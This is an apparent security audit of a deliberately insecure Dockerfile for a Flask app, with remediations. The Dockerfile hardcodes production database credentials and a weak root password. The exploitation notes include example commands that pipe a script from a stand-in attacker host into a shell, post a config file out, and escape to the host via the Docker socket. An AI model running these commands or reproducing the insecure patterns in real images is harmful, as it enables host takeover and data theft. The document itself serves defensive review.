# 0. Insecure Dockerfile Analysis — DevStream

**Auditor:** CyberShield Consulting — Security Engineering
**Target:** DevStream main application image (Flask app)
**Scope:** Static review of the Dockerfile provided by DevStream

## Dockerfile under review

```dockerfile
FROM ubuntu:latest

RUN apt-get update && apt-get install -y \
    python3 python3-pip curl wget vim net-tools iputils-ping gcc make sudo

RUN echo 'root:devstream123' | chpasswd

ENV DB_HOST=prod-db.devstream.internal
ENV DB_USER=admin
ENV DB_PASSWORD=Sup3rS3cr3t!Pr0d

WORKDIR /app
COPY . /app

RUN pip3 install -r requirements.txt

EXPOSE 5000

CMD ["python3", "app.py"]
```

## Summary

| # | Issue | Line(s) | Severity |
|---|-------|---------|----------|
| 1 | Container runs as root (no `USER`) | whole file | Critical |
| 2 | Production DB credentials hardcoded in `ENV` | `ENV DB_*` | Critical |
| 3 | Root password set to a weak, known value | `chpasswd` | Critical |
| 4 | `sudo` installed in the image | `apt-get install` | High |
| 5 | Unpinned, mutable base image (`ubuntu:latest`) | `FROM` | High |
| 6 | Full-OS base image (800MB+) for a Python app | `FROM` | High |
| 7 | Build tools left in the final image (`gcc`, `make`) | `apt-get install` | High |
| 8 | Network / attacker tooling installed (`curl`, `wget`, `net-tools`, `ping`, `vim`) | `apt-get install` | High |
| 9 | `COPY . /app` copies the whole build context | `COPY` | High |
| 10 | Python dependencies not pinned / not verified | `pip3 install` | Medium |
| 11 | No `--no-install-recommends`, apt cache not cleaned | `apt-get install` | Medium |
| 12 | Application files owned by root and writable | `COPY` | Medium |
| 13 | Internal infrastructure hostname disclosed | `ENV DB_HOST` | Low |
| 14 | No `HEALTHCHECK` | whole file | Low |
| 15 | Single-stage build | whole file | Low |

---

## 1. Container runs as root

**Problem.** There is no `USER` instruction, so `python3 app.py` runs as UID 0. The comment "Run as root because it's easier" confirms it is intentional.

**Why it's dangerous.** Root inside the container is the same UID 0 as on the host, separated only by namespaces. Any compromise of the application gives the attacker full control of the container: read any file, install packages, modify the application code, write to mounted volumes as root. Without user namespaces, a single kernel or runtime bug (CVE-2019-5736 runc, CVE-2022-0185, CVE-2024-21626 "Leaky Vessels") turns this into root on the host.

**Exploitation.** The attacker gets RCE in the Flask app (SSTI, deserialisation, command injection), then has root immediately, with no privilege escalation needed. This is exactly what happened in the DevStream incident: as root they read the mounted volumes and used the mounted Docker socket (`/var/run/docker.sock`, root-owned) to run `docker run --privileged -v /:/host ... chroot /host` and own the host.

## 2. Production database credentials hardcoded in `ENV`

**Problem.** `DB_HOST`, `DB_USER=admin` and `DB_PASSWORD=Sup3rS3cr3t!Pr0d` are baked into the image.

**Why it's dangerous.** `ENV` values are stored in the image config and every layer. They are visible to anyone who can pull the image (`docker history --no-trunc`, `docker inspect`), to anyone who can read the Dockerfile in source control, and to every process in the container (`/proc/1/environ`, `env`). The secret can't be rotated without rebuilding, and it's the `admin` account, for production.

**Exploitation.**
- Anyone with registry read access runs `docker inspect devstream/app | grep DB_` and has production DB admin creds, without ever attacking the app.
- After RCE: `cat /proc/self/environ` or `env`, then connect to `prod-db.devstream.internal` as admin to dump or destroy all customer data.
- Leaked images (public registry, CI cache, laptop) leak the credentials forever.

## 3. Root password set to a weak, known value

**Problem.** `echo 'root:devstream123' | chpasswd` gives root a weak password that is now written in the Dockerfile and in the image history.

**Why it's dangerous.** The password is guessable (company name + digits) and public to anyone with the Dockerfile or image. It's a backdoor: any low-privilege foothold (if the app ever ran as a normal user) can become root with `su`. The `/etc/shadow` hash is also in the image layers, and the same password is likely reused elsewhere at DevStream.

**Exploitation.** `su -` with `devstream123` from any shell in the container. If SSH or another login service is ever added, direct remote root login. The hash can be pulled from the image and the password tried on other DevStream systems (credential reuse).

## 4. `sudo` installed

**Problem.** `sudo` is installed in a container that has no reason to need it.

**Why it's dangerous.** It's a ready-made privilege-escalation path and attack surface (setuid binary with its own history of CVEs, e.g. CVE-2021-3156 "Baron Samedit" heap overflow giving root to any local user). Containers should never need `sudo`; privileged steps belong at build time.

**Exploitation.** Once the app is fixed to run as non-root, `sudo` (combined with the known root password, or a sudo CVE) lets the attacker go straight back to root.

## 5. Unpinned, mutable base image (`ubuntu:latest`)

**Problem.** `latest` is a moving tag; no version, no digest.

**Why it's dangerous.** Builds aren't reproducible: two builds a week apart give different images, and a security review of one doesn't apply to the next. A new Ubuntu release can silently change packages and break or weaken things. Without a digest pin, the image isn't integrity-checked against a known good version (supply-chain / tag-hijacking risk, especially through mirrors or a compromised registry).

**Exploitation.** If the tag (or a mirror / internal proxy) is poisoned, the next build pulls the attacker's image and ships it to production. Auditors can't tell which OS version is actually running, so vulnerable versions go unnoticed.

## 6. Full OS base image for a simple Python app

**Problem.** `ubuntu` (plus all installed packages, 800MB+) is used for a small Flask app. Python is installed from apt on top of a general-purpose OS.

**Why it's dangerous.** Every package is potential vulnerabilities: a full distro brings a shell, package manager, coreutils, setuid binaries, hundreds of libraries. Trivy on such an image typically reports hundreds of CVEs. More binaries means more "living off the land" tools for an attacker and more to patch.

**Exploitation.** The attacker uses the shell, `apt-get`, and available tools to install whatever they need (scanners, reverse shells, miners). Vulnerable libraries in the image can be chained to escalate privileges inside the container. A slim/distroless image (`python:3.12-slim`, `gcr.io/distroless/python3`) would remove most of this.

## 7. Build tools left in the final image (`gcc`, `make`)

**Problem.** Compilers and build tools are installed and never removed, because there's no multi-stage build.

**Why it's dangerous.** They are only needed to compile pip wheels, not to run the app. In production they let an attacker compile code directly on the target.

**Exploitation.** The attacker uploads the source of a kernel exploit (e.g. Dirty Pipe CVE-2022-0847, or a container-escape PoC) and compiles it in the container with `gcc`, matched exactly to the running kernel. Also compiles custom backdoors and rootkits that bypass signature detection.

## 8. Network and attacker-friendly tooling installed

**Problem.** `curl`, `wget`, `net-tools`, `iputils-ping` and `vim` are installed "for debugging".

**Why it's dangerous.** These are the attacker's toolkit, pre-installed: download payloads, exfiltrate data, map the internal network, edit files. They are not needed for the app to run, and add more CVEs (curl and wget have a long CVE history).

**Exploitation.**
- `wget http://attacker/shell.sh -O- | sh` or `curl` to pull second-stage payloads.
- `curl -X POST -d @/app/config.py http://attacker/` to exfiltrate data.
- `netstat`/`ifconfig`/`ping` to discover `prod-db.devstream.internal` and other internal services for lateral movement.
- `curl --unix-socket /var/run/docker.sock http://localhost/containers/create ...` to talk to the mounted Docker socket and spawn a privileged container (the actual escape path used in the incident).
- `vim` to modify `app.py` and plant a persistent web backdoor.

## 9. `COPY . /app` copies the whole build context

**Problem.** Everything in the build directory is copied, and no `.dockerignore` is mentioned.

**Why it's dangerous.** It typically pulls in `.git/` (full history, including old committed secrets), `.env` files, SSH keys, cloud credentials, test data, `docker-compose.yml`, CI configs, and the Dockerfile itself (with the DB password). All of this ends up in the image layer, readable by anyone with the image.

**Exploitation.** `docker run --rm devstream/app cat /app/.env`, or extract the layer and run `git log -p` on `/app/.git` to recover every secret ever committed. After RCE, the attacker reads them directly from `/app`.

## 10. Python dependencies not pinned or verified

**Problem.** `pip3 install -r requirements.txt` with no pinned versions guaranteed, no hashes (`--require-hashes`), run as root, with cache kept.

**Why it's dangerous.** Unpinned versions pull whatever is newest: builds are not reproducible and can include a vulnerable or malicious release (typosquatting, dependency confusion, compromised maintainer). Installing as root means any malicious `setup.py` runs with root privileges at build time. The pip cache inflates the image.

**Exploitation.** An attacker publishes a malicious package version, or a public package with the same name as an internal one (dependency confusion); the next build installs and runs it as root, planting a backdoor in the production image.

## 11. No `--no-install-recommends`, apt cache not cleaned

**Problem.** `apt-get install -y` without `--no-install-recommends`, and `/var/lib/apt/lists/*` is never removed.

**Why it's dangerous.** Recommended packages add dozens of unneeded packages (more CVEs, more tools). The apt lists stay in the layer, increasing size and letting an attacker install packages easily. Hadolint flags both (DL3015, DL3009), plus unpinned apt versions (DL3008).

**Exploitation.** More installed software means more vulnerabilities to exploit and more tools available after compromise; `apt-get install` works offline-ish from cached lists, letting the attacker install tooling quickly.

## 12. Application files owned by root and writable

**Problem.** `COPY . /app` without `--chown`, and the app runs as root, so the code is writable by the running process. The filesystem is not read-only.

**Why it's dangerous.** The running process can modify its own code. There's no separation between "code" and "runtime data".

**Exploitation.** After RCE the attacker edits `app.py` or a template to add a persistent web shell or credential-harvesting code that survives until the container is rebuilt, and steals every user's login.

## 13. Internal infrastructure disclosed

**Problem.** `DB_HOST=prod-db.devstream.internal` reveals internal DNS naming and the production DB location.

**Why it's dangerous.** Information disclosure that helps reconnaissance: internal hostnames, naming scheme, and that this container can reach production DB directly (no network segmentation).

**Exploitation.** Combined with issue 2, the attacker knows exactly where to connect. The naming pattern lets them guess other internal hosts (`prod-redis.devstream.internal`, etc.) for lateral movement.

## 14. No `HEALTHCHECK`

**Problem.** No `HEALTHCHECK` instruction (CIS Docker Benchmark 4.6).

**Why it's dangerous.** The orchestrator can't detect a crashed, hung or hijacked application. Availability issues and some compromises (app replaced or crashed by an exploit) go unnoticed.

**Exploitation.** An attacker who crashes or replaces the Flask process (e.g. with their own listener on port 5000) is not detected by health monitoring and the container is never restarted.

## 15. Single-stage build

**Problem.** Build-time and run-time are in the same stage.

**Why it's dangerous.** Everything needed to build (compilers, headers, pip cache, source context) ships to production. It's the root cause of issues 6, 7 and 11.

**Exploitation.** See issues 7 and 8: the attacker inherits a full build environment. A multi-stage build (builder with `gcc` → slim runtime with only the venv and app) removes it.

---

## Related runtime issues seen in the incident (not in the Dockerfile)

The Dockerfile made the attack easy, but the incident also relied on how the container was run:

- **Docker socket mounted** (`-v /var/run/docker.sock:/var/run/docker.sock`): access to the socket is equivalent to root on the host. Never mount it in an application container.
- **Full default capabilities**: no `--cap-drop=ALL`, so `CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_SETUID`, `CAP_NET_RAW`... are available.
- **No `--security-opt no-new-privileges`**: setuid binaries (`sudo`, `su`) can raise privileges.
- **No `--read-only`** filesystem.
- **No resource limits** (`--memory`, `--cpus`, `--pids-limit`): a compromised container can DoS the host (fork bomb, crypto-mining).

## Remediation summary

| Issue | Fix |
|-------|-----|
| Root user | `RUN useradd --system --uid 10001 appuser` + `USER appuser` |
| Hardcoded secrets | Remove all `ENV DB_*`; inject at runtime via Docker secrets / `--env-file` / a secrets manager; use BuildKit `--mount=type=secret` for build-time secrets; rotate the leaked password now |
| Root password / sudo | Remove `chpasswd` and `sudo` entirely |
| Base image | `FROM python:3.12-slim@sha256:<digest>` (or distroless) |
| Build tools | Multi-stage: compile in a builder stage, copy only the venv to the runtime stage |
| Extra tools | Install nothing beyond the runtime; use `docker debug` / ephemeral debug containers instead |
| COPY context | `.dockerignore` (`.git`, `.env`, `*.pem`, `Dockerfile`...), copy only needed files, `--chown=appuser:appuser` |
| Dependencies | Pinned versions with `--require-hashes`, `pip install --no-cache-dir` |
| apt hygiene | `--no-install-recommends`, pinned versions, `rm -rf /var/lib/apt/lists/*` |
| Healthcheck | `HEALTHCHECK CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000/health')"` |
| Runtime | `--cap-drop=ALL --security-opt no-new-privileges --read-only --tmpfs /tmp --memory 256m --cpus 0.5 --pids-limit 100`, never mount the Docker socket |
